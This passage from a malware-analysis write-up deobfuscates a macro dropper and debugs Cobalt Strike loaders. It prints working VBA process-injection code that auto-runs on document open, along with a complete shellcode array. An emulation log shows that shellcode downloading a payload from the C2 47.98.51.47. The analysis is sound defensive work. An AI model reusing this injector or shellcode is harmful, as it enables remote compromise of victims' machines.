"65"&Chr(44)&"80"&Chr(44)&"91"&Chr(44)&"52"&Chr(44)&"92"&Chr(44)&"80"&Chr(44)&"90"&Chr(44)&"88"&Chr(44)&"53"&Chr(44)&"52"&Chr(44)&"40"&Chr(44)&"80"&Chr(44)&"94"&Chr(44)&"41"&Chr(44)&"55"&Chr(44)&"67"&Chr(44)& _
"67"&Chr(44)&"41"&Chr(44)&"55"&Chr(44)&"125"&Chr(44)&"36"&Chr(44)&"69"&Chr(44)&"73"&Chr(44)&"67"&Chr(44)&"65"&Chr(44)&"82"&Chr(44)&"45"&Chr(44)&"83"&Chr(44)&"84"&Chr(44)&"65"&Chr(44)&"78"&Chr(44)&"68"& _
Chr(44)&"65"&Chr(44)&"82"&Chr(44)&"68"&Chr(44)&"45"&Chr(44)&"65"&Chr(44)&"78"&Chr(44)&"84"&Chr(44)&"73"&Chr(44)&" _"&Chr(10)&"86"&Chr(44)&"73"&Chr(44)&"82"&Chr(44)&"85"&Chr(44)&"83"&Chr(44)&"45"&Chr(44)& _
"84"&Chr(44)&"69"&Chr(44)&"83"&Chr(44)&"84"&Chr(44)&"45"&Chr(44)&"70"&Chr(44)&"73"&Chr(44)&"76"&Chr(44)&"69"&Chr(44)&"33"&Chr(44)&"36"&Chr(44)&"72"&Chr(44)&"43"&Chr(44)&"72"&Chr(44)&"42"&Chr(44)&"0"&Chr(44)& _
"53"&Chr(44)&"79"&Chr(44)&"33"&Chr(44)&"0"&Chr(44)&"104"&Chr(44)&Chr(45)&"16"&Chr(44)&Chr(45)&"75"&Chr(44)&Chr(45)&"94"&Chr(44)&"86"&Chr(44)&Chr(45)&"1"&Chr(44)&Chr(45)&"43"&Chr(44)&"106"&Chr(44)&"64"& _
Chr(44)&"104"&Chr(44)&"0"&Chr(44)&"16"&Chr(44)&"0"&Chr(44)&"0"&Chr(44)&" _"&Chr(10)&"104"&Chr(44)&"0"&Chr(44)&"0"&Chr(44)&"64"&Chr(44)&"0"&Chr(44)&"87"&Chr(44)&"104"&Chr(44)&"88"&Chr(44)&Chr(45)&"92"&Chr(44)& _
"83"&Chr(44)&Chr(45)&"27"&Chr(44)&Chr(45)&"1"&Chr(44)&Chr(45)&"43"&Chr(44)&Chr(45)&"109"&Chr(44)&Chr(45)&"71"&Chr(44)&"0"&Chr(44)&"0"&Chr(44)&"0"&Chr(44)&"0"&Chr(44)&"1"&Chr(44)&Chr(45)&"39"&Chr(44)&"81"& _
Chr(44)&"83"&Chr(44)&Chr(45)&"119"&Chr(44)&Chr(45)&"25"&Chr(44)&"87"&Chr(44)&"104"&Chr(44)&"0"&Chr(44)&"32"&Chr(44)&"0"&Chr(44)&"0"&Chr(44)&"83"&Chr(44)&"86"&Chr(44)&"104"&Chr(44)&"18"&Chr(44)&Chr(45)& _
"106"&Chr(44)&Chr(45)&"119"&Chr(44)&Chr(45)&"30"&Chr(44)&Chr(45)&"1"&Chr(44)&Chr(45)&"43"&Chr(44)&" _"&Chr(10)&Chr(45)&"123"&Chr(44)&Chr(45)&"64"&Chr(44)&"116"&Chr(44)&Chr(45)&"58"&Chr(44)&Chr(45)&"117"& _
Chr(44)&"7"&Chr(44)&"1"&Chr(44)&Chr(45)&"61"&Chr(44)&Chr(45)&"123"&Chr(44)&Chr(45)&"64"&Chr(44)&"117"&Chr(44)&Chr(45)&"27"&Chr(44)&"88"&Chr(44)&Chr(45)&"61"&Chr(44)&Chr(45)&"24"&Chr(44)&Chr(45)&"87"&Chr(44)& _
Chr(45)&"3"&Chr(44)&Chr(45)&"1"&Chr(44)&Chr(45)&"1"&Chr(44)&"52"&Chr(44)&"55"&Chr(44)&"46"&Chr(44)&"57"&Chr(44)&"56"&Chr(44)&"46"&Chr(44)&"53"&Chr(44)&"49"&Chr(44)&"46"&Chr(44)&"52"&Chr(44)&"55"&Chr(44)& _
"0"&Chr(44)&"0"&Chr(44)&"0"&Chr(44)&"0"&Chr(44)&"0"&Chr(41)&Chr(10)&"    If L"&"en"&Chr(40)&"Environ"&Chr(40)&Chr(34)&"ProgramW"&"6432"&Chr(34)&Chr(41)&Chr(41)&" "&Chr(62)&" 0 Then"&Chr(10)&"        "& _
"sProc "&Chr(61)&" Environ"&Chr(40)&Chr(34)&"windir"&Chr(34)&Chr(41)&" "&Chr(38)&" "&Chr(34)&Chr(92)&Chr(92)&"SysWOW64"&Chr(92)&Chr(92)&"rundll32"&Chr(46)&"exe"&Chr(34)&Chr(10)&"    Else"&Chr(10)&"        "& _
"sProc "&Chr(61)&" Environ"&Chr(40)&Chr(34)&"windir"&Chr(34)&Chr(41)&" "&Chr(38)&" "&Chr(34)&Chr(92)&Chr(92)&"System32"&Chr(92)&Chr(92)&"rundll32"&Chr(46)&"exe"&Chr(34)&Chr(10)&"    End "&"If"&Chr(10)& _
Chr(10)&"    res "&Chr(61)&" RunStuf"&"f"&Chr(40)&"sNull"&Chr(44)&" sProc"&Chr(44)&" ByVal 0"&Chr(38)&Chr(44)&" ByVal 0"&Chr(38)&Chr(44)&" ByVal 1"&Chr(38)&Chr(44)&" ByVal 4"&Chr(38)&Chr(44)&" ByVal 0"& _
Chr(38)&Chr(44)&" sNull"&Chr(44)&" sInfo"&Chr(44)&" pInfo"&Chr(41)&Chr(10)&Chr(10)&"    rwxp"&"age "&Chr(61)&" AllocSt"&"uff"&Chr(40)&"pInfo"&Chr(46)&"hProcess"&Chr(44)&" 0"&Chr(44)&" UBound"&Chr(40)&"myArray"& _
Chr(41)&Chr(44)&" "&Chr(38)&"H1000"&Chr(44)&" "&Chr(38)&"H40"&Chr(41)&Chr(10)&"    For "&"offset "&Chr(61)&" LBound"&Chr(40)&"myArray"&Chr(41)&" To UBou"&"nd"&Chr(40)&"myArray"&Chr(41)&Chr(10)&"        "& _
"myByte "&Chr(61)&" myArray"&Chr(40)&"offset"&Chr(41)&Chr(10)&"        "&"res "&Chr(61)&" WriteSt"&"uff"&Chr(40)&"pInfo"&Chr(46)&"hProcess"&Chr(44)&" rwxpage"&" "&Chr(43)&" offset"&Chr(44)&" myByte"&Chr(44)& _
" 1"&Chr(44)&" ByVal 0"&Chr(38)&Chr(41)&Chr(10)&"    Next"&" offset"&Chr(10)&"    res "&Chr(61)&" CreateS"&"tuff"&Chr(40)&"pInfo"&Chr(46)&"hProcess"&Chr(44)&" 0"&Chr(44)&" 0"&Chr(44)&" rwxpage"&Chr(44)& _
" 0"&Chr(44)&" 0"&Chr(44)&" 0"&Chr(41)&Chr(10)&"End Sub"&Chr(10)&"Sub Auto"&"Open"&Chr(40)&Chr(41)&Chr(10)&"    Auto"&"_Open"&Chr(10)&"End Sub"&Chr(10)&"Sub Work"&"book_Ope"&"n"&Chr(40)&Chr(41)&Chr(10)& _
"    Auto"&"_Open"&Chr(10)&"End Sub"&Chr(10)
objExcel.DisplayAlerts = False
on error resume next
objExcel.Run "Auto_Open"
objWorkbook.Close False
objExcel.Quit

' Restore the registry to its old state
if action = "" then
	WshShell.RegDelete RegPath
else
	WshShell.RegWrite RegPath, action, "REG_DWORD"
end if
self.close

```
The readable elements of the script appear to use Excel add-ins to execute the VBS code. We're going to need to deobfuscate the VBS code in order to ascertain what is being executed.

Decimal encoded characters are used as a means of obfuscation, we can overcome this by creating a subsection which will "isolate" that part of the script and only apply operators to that section.

We'll create a subsection with regex "Chr\(\d+\)", we will then use the regex "\d+" and list the output, this will output all of the decimal values, ready for our From Decimal operator.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/a70de964-5e5e-4454-8ecb-2534c2639fad)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/ebb3e407-63c2-403c-bd97-71e7c25925ea)

We can then clean up the rest of the code by removing new lines, underscores, ampersands

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/489b914d-9e62-4382-84e8-4ddd8fc7e3c2)

Deobfuscated Code:

```
Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As LongEnd Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As StringdwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

#If VBA7 ThenPrivate Declare PtrSafe Function CreateStuff Lib kernel32 Alias CreateRemoteThread (ByVal hProcess As Long,ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
    Private Declare PtrSafe Function AllocStuff Lib kernel32 AliasVirtualAllocEx (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function WriteStuff Lib kernel32 Alias WriteProcessMemory (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr
    Private Declare PtrSafe Function RunStuff Lib kernel32 Alias CreateProcessA(ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String,lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#Else
    Private Declare Function CreateStuff Lib kernel32 Alias CreateRemoteThread (ByVal hProcess As Long, ByVal lpThreadAttributes As Long,ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
    Private Declare Function AllocStuff Lib kernel32 Alias VirtualAllocEx (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPrivate Declare Function WriteStuff Lib kernel32 Alias WriteProcessMemory (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
    Private Declare Function RunStuff Lib kernel32 Alias CreateProcessA (ByVal lpApplicationName As String, ByVal lpCommandLine As String,lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION)As Long
#End If

Sub Auto_Open()
    Dim myByte As Long, myArray As Variant, offset As Long
    DimpInfo As PROCESS_INFORMATION
    Dim sInfo As STARTUPINFO
    Dim sNull As String
    Dim sProc As String

#If VBA7Then
    Dim rwxpage As LongPtr, res As LongPtr
#Else
    Dim rwxpage As Long, res As Long
#End IfmyArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49,13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1,-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4,-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1,-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,91,-22,0,0,83,80,104,87,-119,-97,-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86,104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1,-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1,-1,-1,47,71,100,97,80,0,53,79,33,80,37,64,65,80,91,52,92,80,90,88,53,52,40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82,45,83,84,65,78,68,65,82,68,45,65,78,84,73,86,73,82,85,83,45,84,69,83,84,45,70,73,76,69,33,36,72,43,72,42,0,53,79,33,80,37,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,52,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77,83,73,69,32,56,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,53,46,49,59,32,84,114,105,100,101,110,116,47,52,46,48,59,32,71,84,66,55,46,52,59,32,46,78,69,84,52,46,48,67,41,13,10,0,53,79,33,80,37,64,65,80,91,52,92,80,90,88,53,52,40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82,45,83,84,65,78,68,65,82,68,45,65,78,84,73,86,73,82,85,83,45,84,69,83,84,45,70,73,76,69,33,36,72,43,72,42,0,53,79,33,80,37,64,65,80,91,52,92,80,90,88,53,52,40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82,45,83,84,65,78,68,65,82,68,45,65,78,84,73,86,73,82,85,83,45,84,69,83,84,45,70,73,76,69,33,36,72,43,72,42,0,53,79,33,80,37,64,_
65,80,91,52,92,80,90,88,53,52,40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82,45,83,84,65,78,68,65,82,68,45,65,78,84,73,86,73,82,85,83,45,84,69,83,84,45,70,73,76,69,33,36,72,43,72,42,0,53,79,33,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0,104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43,-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,52,55,46,57,56,46,53,49,46,52,55,0,0,0,0,0)
    If Len(Environ(ProgramW6432)) > 0 ThensProc = Environ(windir)  \\SysWOW64\\rundll32.exe
    ElsesProc = Environ(windir)  \\System32\\rundll32.exe
    End Ifres = RunStuff(sNull, sProc, ByVal 0, ByVal 0, ByVal 1, ByVal 4, ByVal 0, sNull, sInfo, pInfo)

    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), H1000, H40)
    For offset = LBound(myArray) To UBound(myArray)myByte = myArray(offset)
        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte,1, ByVal 0)
    Next offset
    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage,0, 0, 0)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()Auto_Open
End Sub

```

Immediately noticeable are the APIs associated with injection - VirtualAlloc, WriteProcessMemory and CreateProcessA. We also notice an array of decimals, which is assumed to be Shellcode given the context and its size.

We can take this array and clean it up by removing all instances of underscores.

Next, we need to fix the negative values, since these are bytes with a maximum value of 256, we want to replace (-4) with the value of (256 - 4) and so on, which can be achieved by using the following CyberChef recipe.

We create a subsection to match all of the negative values (-\d+). We then find and replace these negative values with "256 + original value", for example, "-4" = "256 - 4".

We then add a Subtract operator with a space delimiter, subtracting the original value from 256, we'll then use a Merge operator, ending the subsection, and do a From Decimal operator to extract the shellcode.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/75aac014-fa6d-4c72-95e8-b2489f443f77)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/e920a79a-3dee-424f-81ac-2e27f2865997)

This shellcode has plaintext references to a UserAgent and the C2 address:

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/b11b6a17-f5b0-4a4e-8701-b0248c622504)

Running the shellcode through Speakeasy, we can gain further context:

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/cc074c00-a537-4c0e-83ba-3fe9af230b31)

```
* exec: shellcode
0x10a2: 'kernel32.LoadLibraryA("wininet")' -> 0x7bc00000
0x10b0: 'wininet.InternetOpenA(0x0, 0x0, 0x0, 0x0, 0x0)' -> 0x20
0x10cc: 'wininet.InternetConnectA(0x20, "47.98.51.47", 0xea5b, 0x0, 0x0, 0x3, 0x0, 0x0)' -> 0x24
0x10e4: 'wininet.HttpOpenRequestA(0x24, 0x0, "/GdaP", 0x0, 0x0, 0x0, "INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD", 0x0)' -> 0x28
0x10f8: 'wininet.HttpSendRequestA(0x28, "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.4; .NET4.0C)\r\\n", 0xffffffff, 0x0, 0x0)' -> 0x1
0x111a: 'user32.GetDesktopWindow()' -> 0x198
0x1129: 'wininet.InternetErrorDlg(0x198, 0x28, 0x111a, 0x7, 0x0)' -> None
0x12de: 'kernel32.VirtualAlloc(0x0, 0x400000, 0x1000, "PAGE_EXECUTE_READWRITE")' -> 0x450000
0x12f9: 'wininet.InternetReadFile(0x28, 0x450000, 0x2000, 0x1203fd4)' -> 0x1
0x12f9: 'wininet.InternetReadFile(0x28, 0x451000, 0x2000, 0x1203fd4)' -> 0x1
0x450012: Unhandled interrupt: intnum=0x3
0x450012: shellcode: Caught error: unhandled_interrupt
* Finished emulating
```

The shellcode is a downloader with C2 address 47.98.51[.]47.

Rather than using an emulator, we can debug the shellcode by loading it with blobrunner and attaching x32dbg to the process.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/62efd60a-1ac5-4a01-aaeb-684e06f99547)

We'll use the address that blobrunner has given us and set a breakpoint there, we'll then run the shellcode and switch to a graph view which will look like the following:

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/a27923f5-642c-4f39-ad01-9c7c7a20c37d)

We'll navigate to the bottom of the graph and set a breakpoint at the JMP function, this is where the API calls will occur.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/26204898-a5e9-4d18-9792-bce775bb4bc9)

The values will be present on the right-hand side of the screen where we can again see the C2 address.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/8ab68a61-7a16-4a10-9c97-47b9b09fa7a0)


## Cobalt Strike Binary Loader

When analysing Cobalt Strike binaries, we can typically load the executable into x32/64dbg and set our first breakpoint at the VirtualAlloc function.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/5382ce8c-1ca9-4110-b89d-8b325626d6df)

We'll then run through execution until we meet that breakpoint.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/b235aeac-1813-478a-bd6c-359b9ad9c9e2)

We can then use the "execute til return" option, which will step over the instructions until the current instruction pointed to by EIP or RIP is ret instruction.

WWe'll make note of the first register's address and follow it in dump by right-clicking and selecting that option.

This will give us an empty memory buffer at the bottom of the screen, we're going to set a breakpoint on the first byte of this buffer by doing the following:

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/35f061b8-2d8c-4dd7-a300-c006626c1654)

We'll hit that breakpoint by running the executable and we can see that the first byte has been written with "FC", which is very common for shellcode and has been evident in the previous examples.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/27a2501a-2023-41bf-8890-4cc77d528270)

We'll execute until return again and can see the buffer fill up with seemingly meaningless characters, however, this is our shellcode.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/12348d10-9b8a-47ad-802f-f258f4761b7d)

We can choose to dump this shellcode and run it through an emulator like Speakeasy to get the out. We can do this by right-clicking, following in memory map, right-clicking the address and dumping to a file.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/1ca4ccdb-1158-4d01-b703-92d67b3d83df)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/a813755c-9368-4210-9256-e0ed32ab70fc)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/83f1c73e-8ce7-4722-bd07-de7fb55a34f2)

Alternatively, we can continue with using x64dbg to gather this information.

Following the shellcode in the disassembler and switching to a graph view, we can see where API calls are likely mdae at the bottom of the graph

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/0bb3fd2e-b208-4291-95f1-9773de505868)

We'll set a breakpoint here and see what values are being resolved.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/75e42ba4-0122-4f7e-bbb4-76966476b270)

This will end up showing our C2 domain being passed to the wininet.InternetConnectA function.










